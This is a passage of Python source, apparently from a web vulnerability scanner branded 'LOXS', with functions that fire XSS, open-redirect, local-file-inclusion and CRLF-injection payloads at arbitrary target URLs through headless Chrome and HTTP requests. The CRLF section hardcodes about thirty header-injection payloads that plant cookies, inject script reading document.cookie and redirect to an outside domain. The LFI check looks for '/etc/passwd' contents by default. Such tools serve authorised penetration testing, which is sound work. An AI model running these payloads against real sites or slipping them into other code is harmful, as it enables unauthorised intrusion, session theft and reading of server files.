                                    encoded_url = f"{url}{encoded_stripped_payload}"
                                    if single_url_scan:
                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                        encoded_url_with_payload = encoded_url
                                    else:
                                        list_stripped_payload = url_with_payload
                                        for u in urls:
                                            list_stripped_payload = list_stripped_payload.replace(u, '')
                                        encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                        encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                    print(f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                total_scanned += 1

                print_scan_summary(total_found, total_scanned, start_time)
                save_results(vulnerable_urls, total_found, total_scanned, start_time)
            except Exception as e:
                print(f"{Fore.RED}An error occurred: {str(e)}")
            finally:
                if 'executor' in locals():
                    executor.shutdown(wait=False)
                os._exit(0)

        if __name__ == "__main__":
            try:
                main()
            except KeyboardInterrupt:
                os._exit(0)


    def run_xss_scanner(scan_state=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        logging.getLogger('WDM').setLevel(logging.ERROR)
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        console = Console()

        def load_payloads(payload_file):
            try:
                with open(payload_file, "r") as file:
                    return [line.strip() for line in file if line.strip()]
            except Exception as e:
                print(Fore.RED + f"[!] Error loading payloads: {e}")
                os._exit(0)

        def generate_payload_urls(url, payload):
            url_combinations = []
            scheme, netloc, path, query_string, fragment = urlsplit(url)
            if not scheme:
                scheme = 'http'
            query_params = parse_qs(query_string, keep_blank_values=True)
            for key in query_params.keys():
                modified_params = query_params.copy()
                modified_params[key] = [payload]
                modified_query_string = urlencode(modified_params, doseq=True)
                modified_url = urlunsplit((scheme, netloc, path, modified_query_string, fragment))
                url_combinations.append(modified_url)
            return url_combinations

        async def check_vulnerability(url, payloads, vulnerable_urls, total_scanned, driver):
            for payload in payloads:
                payload_urls = generate_payload_urls(url, payload)
                if not payload_urls:
                    continue
                for payload_url in payload_urls:
                    print(Fore.YELLOW + f"[→] Scanning payload: {payload}")
                    try:
                        driver.get(payload_url)
                        total_scanned[0] += 1
                        try:
                            WebDriverWait(driver, 0).until(EC.alert_is_present())
                            alert = driver.switch_to.alert
                            alert_text = alert.text

                            if alert_text:
                                result = Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable:{Fore.GREEN} {payload_url} {Fore.CYAN} - Alert Text: {alert_text}"
                                print(result)
                                vulnerable_urls.append(payload_url)
                                if scan_state:
                                    scan_state['vulnerability_found'] = True
                                    scan_state['vulnerable_urls'].append(payload_url)
                                    scan_state['total_found'] += 1
                                alert.accept()
                            else:
                                result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable:{Fore.RED} {payload_url}"
                                print(result)

                        except TimeoutException:
                            result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable:{Fore.RED} {payload_url}"
                            print(result)

                    except UnexpectedAlertPresentException as e:
                        try:
                            alert = driver.switch_to.alert
                            alert_text = alert.text
                            result = Fore.CYAN + f"[!] Unexpected Alert:{Fore.LIGHTBLACK_EX} {payload_url} {Fore.CYAN} - Alert: {Fore.GREEN}Might be Vulnerable!"
                            print(result)
                            alert.accept()
                        except Exception as inner_e:
                            print(Fore.RED + f"[!] Error handling unexpected alert: {inner_e}")
                    

            if scan_state:
                scan_state['total_scanned'] += len(payloads)

        async def scan(urls, payloads, vulnerable_urls, total_scanned, concurrency, driver):
            semaphore = asyncio.Semaphore(concurrency)
            tasks = []
            for url in urls:
                tasks.append(bound_check(url, semaphore, payloads, vulnerable_urls, total_scanned, driver))
            await asyncio.gather(*tasks)

        async def bound_check(url, semaphore, payloads, vulnerable_urls, total_scanned, driver):
            async with semaphore:
                await check_vulnerability(url, payloads, vulnerable_urls, total_scanned, driver)

        def run_scan(urls, payload_file, concurrency, timeout):
            payloads = load_payloads(payload_file)
            vulnerable_urls = []
            total_scanned = [0]
            start_time = time.time()

            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            logging.getLogger('urllib3').setLevel(logging.CRITICAL)

            driver_service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=driver_service, options=chrome_options)
            
            try:
                asyncio.run(scan(urls, payloads, vulnerable_urls, total_scanned, concurrency, driver))
            except Exception as e:
                print(Fore.RED + f"[!] Error during scan: {e}")
            finally:
                driver.quit()
            
            return vulnerable_urls, total_scanned[0]

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            for line in summary:
                print(Fore.YELLOW + line)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            action = input(Fore.CYAN + "[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
            if action == 'y':
                html_content = generate_html_report("Cross-Site Scripting (XSS)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
                
                filename = input(Fore.CYAN + "[?] Enter the filename for the HTML report (e.g., report.html) or press Enter to use 'xss_report.html': ").strip()
                if not filename:
                    filename = 'xss_report.html'
                    print(Fore.YELLOW + "[i] No filename provided. Using 'xss_report.html'.")

                print(f"DEBUG: Chosen filename: '{filename}'")
                
                report_file = save_html_report(html_content, filename)
            else:
                print(Fore.RED + "[!] Invalid option. Exiting the program.")
                os._exit(0)

        def clear_screen():
            os.system('cls' if os.name == 'nt' else 'clear')

        def get_file_path(prompt_text):
            completer = PathCompleter()
            return prompt(prompt_text, completer=completer).strip()

        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing URLs (or press Enter to enter a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(Fore.CYAN + "[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
                            clear_screen()
                            print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading the input file. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")

        def prompt_for_valid_file_path(prompt_text):
            while True:
                file_path = get_file_path(prompt_text).strip()
                if not file_path:
                    print(Fore.RED + "[!] You must provide a file containing the payloads.")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")
                    continue
                if os.path.isfile(file_path):
                    return file_path
                else:
                    print(Fore.RED + "[!] Error reading the input file.")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the XSS Scanner!\n")

        def main():
            clear_screen()
            time.sleep(0.1)
            clear_screen()
            panel = Panel(r"""
   _  __________  ____________   _  ___  __________
  | |/_/ __/ __/ / __/ ___/ _ | / |/ / |/ / __/ _  |
  >  <_\ \_\ \  _\ \/ /__/ __ |/    /    / _// , _/
/_/|_/___/___/ /___/\___/_/ |_/_/|_/_/|_/___/_/|_|  
        """,
                style="bold green",
                border_style="blue",
                expand=False
            )

            console.print(panel, "\n")
            print(Fore.GREEN + "Welcome to the XSS Testing Tool!\n")
            urls = prompt_for_urls()

            payload_file = prompt_for_valid_file_path("[?] Enter the path to the payloads file: ")

            try:
                concurrency_input = input(Fore.CYAN + "\n[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
                concurrency = int(concurrency_input) if concurrency_input else 5
                if not 1 <= concurrency <= 10:
                    raise ValueError
            except:
                concurrency = 5
                print(Fore.YELLOW + "[i] Invalid input. Using default concurrency level: 5")

            try:
                timeout_input = input(Fore.CYAN + "[?] Enter the request timeout in seconds (press Enter for 3): ").strip()
                timeout = float(timeout_input) if timeout_input else 3.0
            except:
                timeout = 3.0
                print(Fore.YELLOW + "[i] Invalid input. Using default timeout: 3 seconds")

            print(f"\n{Fore.YELLOW}[i] Loading, please wait...")
            time.sleep(0.1)
            clear_screen()
            print(f"{Fore.CYAN}[i] Starting scan...\n")

            all_vulnerable_urls = []
            total_scanned = 0
            start_time = time.time()

            for url in urls:
                box_content = f" → Scanning URL: {url} "
                box_width = max(len(box_content) + 2, 40)
                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")

                vulnerable_urls, scanned = run_scan([url], payload_file, concurrency, timeout)
                all_vulnerable_urls.extend(vulnerable_urls)
                total_scanned += scanned

            print_scan_summary(len(all_vulnerable_urls), total_scanned, start_time)
            save_results(all_vulnerable_urls, len(all_vulnerable_urls), total_scanned, start_time)
            os._exit(0)

        if __name__ == "__main__":
            try:
                main()
            except KeyboardInterrupt:
                print(Fore.RED + "\n[!] Scan interrupted by the user. Exiting...")
                os._exit(0)

    def run_or_scanner(scan_state=None):
        init(autoreset=True)

        def get_chrome_driver():
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-extensions")
            options.add_argument("--window-size=1920,1080")
            from selenium.webdriver.chrome.service import Service

            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            driver.set_page_load_timeout(10)
            return driver

        def check_payload_with_selenium(url, payload):
            target_url = f"{url}{payload.strip()}"
            driver = None
            try:
                driver = get_chrome_driver()
                print(Fore.YELLOW + f"[→] {Fore.CYAN}Testing payload: {Fore.YELLOW}{payload.strip()} {Fore.CYAN}on {Fore.YELLOW}{target_url} ")
                driver.get(target_url)
                current_url = driver.current_url

                if current_url == "https://www.google.com/":
                    if scan_state:
                        scan_state['vulnerability_found'] = True
                        scan_state['vulnerable_urls'].append(target_url)
                        scan_state['total_found'] += 1
                    return Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN}", True
                else:
                    return Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN}", False

            except TimeoutException:
                return Fore.RED + f"[✗]{Fore.CYAN} Timeout occurred while testing payload: {Fore.RED} {payload.strip()} {Fore.CYAN} on {target_url}", False

            except Exception as e:
                return Fore.RED + f"[✗]{Fore.CYAN} Error for payload {Fore.RED} {payload}: {str(e)}", False
            finally:
                if driver:
                    driver.quit()
                if scan_state:
                    scan_state['total_scanned'] += 1

        def test_open_redirect(url, payloads, max_threads=5):
            found_vulnerabilities = 0
            vulnerable_urls = []

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_payload = {executor.submit(check_payload_with_selenium, url, payload): payload for payload in payloads}
                try:
                    for future in as_completed(future_to_payload):
                        payload = future_to_payload[future]
                        try:
                            result, is_vulnerable = future.result()
                            print(result)
                            if is_vulnerable:
                                found_vulnerabilities += 1
                                vulnerable_urls.append(url + payload.strip())
                        except Exception as e:
                            print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                    raise

            return found_vulnerabilities, vulnerable_urls

        def get_file_path(prompt_text):
            completer = PathCompleter()
            return prompt(prompt_text, completer=completer).strip()

        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(Fore.BLUE + "[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
                            clear_screen()
                            print(Fore.GREEN + "Welcome to the Open Redirect Testing Tool!\n")
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the Open Redirect Testing Tool!\n")

        def prompt_for_payloads():
            while True:
                try:
                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
                    if not os.path.isfile(payload_input):
                        raise FileNotFoundError(f"File not found: {payload_input}")
                    with open(payload_input) as file:
                        payloads = [line.strip() for line in file if line.strip()]
                    return payloads
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the Open Redirect Testing Tool!\n")

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"

            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            if total_scanned > 0:
                generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
                if generate_report == 'y':
                    html_content = generate_html_report("Open Redirect (OR)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
                    filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
                    report_file = save_html_report(html_content, filename)
            else:
                print(Fore.RED + "[!] No URLs were scanned, skipping report generation.")

        def clear_screen():
            os.system('cls' if os.name == 'nt' else 'clear')

        clear_screen()

        required_packages = {
            'requests': '2.28.1',
            'prompt_toolkit': '3.0.36',
            'colorama': '0.4.6'
        }
        check_and_install_packages(required_packages)

        clear_screen()

        panel = Panel(r"""
   ____  ___    ____________   _  ___  __________
  / __ \/ _ \  / __/ ___/ _ | / |/ / |/ / __/ _  |
 / /_/ / , _/ _\ \/ /__/ __ |/    /    / _// , _/
/____//_/|_| /___/\___/_/ |_/_/|_/_/|_/___/_/|_| 
        
                        """,
            style="bold green",
            border_style="blue",
            expand=False
        )
        rich_print(panel, "\n")
        print(Fore.GREEN + "Welcome to the Open Redirect Testing Tool!\n")

        try:
            urls = prompt_for_urls()
            payloads = prompt_for_payloads()

            max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
            max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5

            print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
            clear_screen()
            print(Fore.CYAN + "[i] Starting scan...\n")

            total_found = 0
            total_scanned = 0
            start_time = time.time()
            vulnerable_urls = []

            if scan_state is None:
                scan_state = {
                    'vulnerability_found': False,
                    'vulnerable_urls': [],
                    'total_found': 0,
                    'total_scanned': 0
                }

            if payloads:
                for url in urls:
                    box_content = f" → Scanning URL: {url} "
                    box_width = max(len(box_content) + 2, 40)
                    print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                    print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                    print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n\n")
                    found, urls_with_payloads = test_open_redirect(url, payloads, max_threads)
                    total_found += found
                    total_scanned += len(payloads)
                    vulnerable_urls.extend(urls_with_payloads)

            print_scan_summary(total_found, total_scanned, start_time)
            save_results(vulnerable_urls, total_found, total_scanned, start_time)

            if scan_state['vulnerability_found']:
                print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
                print(Fore.GREEN + f"[+] Vulnerable URLs:")
                for url in scan_state['vulnerable_urls']:
                    print(Fore.GREEN + f"    {url}")
            else:
                print(Fore.YELLOW + "\n[-] No vulnerabilities found.")

            print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")

        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Scan interrupted by user. Generating HTML report...")
            save_results(vulnerable_urls, total_found, total_scanned, start_time)
            if scan_state and scan_state['vulnerability_found']:
                print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
                print(Fore.GREEN + f"[+] Vulnerable URLs:")
                for url in scan_state['vulnerable_urls']:
                    print(Fore.GREEN + f"    {url}")
            else:
                print(Fore.YELLOW + "\n[-] No vulnerabilities found.")
                print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")
            os._exit(1)



    def run_lfi_scanner(scan_state=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        import urllib.parse
        from concurrent.futures import ThreadPoolExecutor, as_completed
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry

        init(autoreset=True)

        def get_random_user_agent():
            return random.choice(USER_AGENTS)
        
        def check_and_install_packages(packages):
            for package, version in packages.items():
                try:
                    __import__(package)
                except ImportError:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', f"{package}=={version}"])

        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
            session = requests.Session()
            retry = Retry(
                total=retries,
                read=retries,
                connect=retries,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
            )
            adapter = HTTPAdapter(max_retries=retry)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            return session
        
        def test_lfi(url, payloads, success_criteria, max_threads=5):
            def check_payload(payload):
                encoded_payload = urllib.parse.quote(payload.strip())
                target_url = f"{url}{encoded_payload}"
                start_time = time.time()
                
                try:
                    response = requests.get(target_url)
                    response_time = round(time.time() - start_time, 2)
                    result = None
                    is_vulnerable = False
                    if response.status_code == 200:
                        is_vulnerable = any(re.search(pattern, response.text) for pattern in success_criteria)
                        if is_vulnerable:
                            result = Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
                        else:
                            result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
                    else:
                        result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"

                    if is_vulnerable and scan_state:
                        scan_state['vulnerability_found'] = True
                        scan_state['vulnerable_urls'].append(target_url)
                        scan_state['total_found'] += 1
                    if scan_state:
                        scan_state['total_scanned'] += 1

                    return result, is_vulnerable
                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
                    return None, False

            found_vulnerabilities = 0
            vulnerable_urls = []
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_payload = {executor.submit(check_payload, payload): payload for payload in payloads}
                for future in as_completed(future_to_payload):
                    payload = future_to_payload[future]
                    try:
                        result, is_vulnerable = future.result()
                        if result:
                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload.strip()}")
                            print(result)
                            if is_vulnerable:
                                found_vulnerabilities += 1
                                vulnerable_urls.append(url + urllib.parse.quote(payload.strip()))
                    except Exception as e:
                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
            return found_vulnerabilities, vulnerable_urls

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
            if generate_report == 'y':
                html_content = generate_html_report("Local File Inclusion (LFI)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
                report_file = save_html_report(html_content, filename)
                
        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(Fore.CYAN + "[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
                            clear_screen()
                            print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the LFI Testing Tool! - AnonKryptiQuz x 1hehaq x Coffinxp x Hexsh1dow x Naho\n")

        def prompt_for_payloads():
            while True:
                try:
                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
                    if not os.path.isfile(payload_input):
                        raise FileNotFoundError(f"File not found: {payload_input}")
                    with open(payload_input) as file:
                        payloads = [line.strip() for line in file if line.strip()]
                    return payloads
                except Exception as e:
                    print(Fore.RED + f"[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
                    input(Fore.YELLOW + "[i] Press Enter to try again...")
                    clear_screen()
                    print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
                    
        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"
            
            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def clear_screen():
            os.system('cls' if os.name == 'nt' else 'clear')

        def get_file_path(prompt_text):
            completer = PathCompleter()
            return prompt(prompt_text, completer=completer).strip()

        clear_screen()

        required_packages = {
            'requests': '2.28.1',
            'prompt_toolkit': '3.0.36',
            'colorama': '0.4.6'
        }
        check_and_install_packages(required_packages)

        time.sleep(1)
        clear_screen()

        panel = Panel(
        r"""
    __    __________   _____                                 
   / /   / ____/  _/  / ___/_________ _____  ____  ___  _____
  / /   / /_   / /    \__ \/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
 / /___/ __/ _/ /    ___/ / /__/ /_/ / / / / / / /  __/ /    
/_____/_/   /___/   /____/\___/\__,_/_/ /_/_/ /_/\___/_/     
                                                        
                                                  
            """,
        style="bold green",
        border_style="blue",
        expand=False
        )
        rich_print(panel, "\n")

        print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")

        urls = prompt_for_urls()
        payloads = prompt_for_payloads()
        success_criteria_input = input("[?] Enter the success criteria patterns (comma-separated, e.g: 'root:,admin:', press Enter for 'root:x:0:'): ").strip()
        success_criteria = [pattern.strip() for pattern in success_criteria_input.split(',')] if success_criteria_input else ['root:x:0:']
        
        max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5

        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
        time.sleep(1)
        clear_screen()
        print(Fore.CYAN + "[i] Starting scan...\n")

        for url in urls:
            get_random_user_agent()

        total_found = 0
        total_scanned = 0
        start_time = time.time()
        vulnerable_urls = []

        if scan_state is None:
            scan_state = {
                'vulnerability_found': False,
                'vulnerable_urls': [],
                'total_found': 0,
                'total_scanned': 0
            }

        if payloads:
            for url in urls:
                box_content = f" → Scanning URL: {url} "
                box_width = max(len(box_content) + 2, 40)
                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
                found, urls_with_payloads = test_lfi(url, payloads, success_criteria, max_threads)
                total_found += found
                total_scanned += len(payloads)
                vulnerable_urls.extend(urls_with_payloads)

        print_scan_summary(total_found, total_scanned, start_time)
        save_results(vulnerable_urls, total_found, total_scanned, start_time)

        if scan_state['vulnerability_found']:
            print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
            print(Fore.GREEN + f"[+] Vulnerable URLs:")
            for url in scan_state['vulnerable_urls']:
                print(Fore.GREEN + f"    {url}")
        else:
            print(Fore.YELLOW + "\n[-] No vulnerabilities found.")

        print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")

        os._exit(0)
        
    def run_crlf_scanner(scan_state=None):
        import re
        import urllib.parse
        import requests
        import urllib3
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        from prompt_toolkit import prompt
        from prompt_toolkit.completion import PathCompleter
        from urllib.parse import urlparse
        init(autoreset=True)

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        def get_domain(url):
            parsed_url = urlparse(url)
            return parsed_url.netloc

        def generate_payloads(url):
            domain = get_domain(url)
            base_payloads = [
                "/%%0a0aSet-Cookie:loxs=injected",
                "/%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%0d%0aLocation: http://loxs.pages.dev",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
                "/%0d%0aLocation: loxs.pages.dev",
                "/%0d%0aSet-Cookie:loxs=injected;",
                "/%0aSet-Cookie:loxs=injected",
                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
                "/%23%0aSet-Cookie:loxs=injected",
                "/%25%30%61Set-Cookie:loxs=injected",
                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
                "/%5Cr%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
                "/%u000ASet-Cookie:loxs=injected;",
                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
            ]
            
            return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]

        REGEX_PATTERNS = [
            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
        ]

        def get_random_user_agent():
            return random.choice(USER_AGENTS)

        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
            session = requests.Session()
            retry = Retry(
                total=retries,
                read=retries,
                connect=retries,
                backoff_factor=backoff_factor,
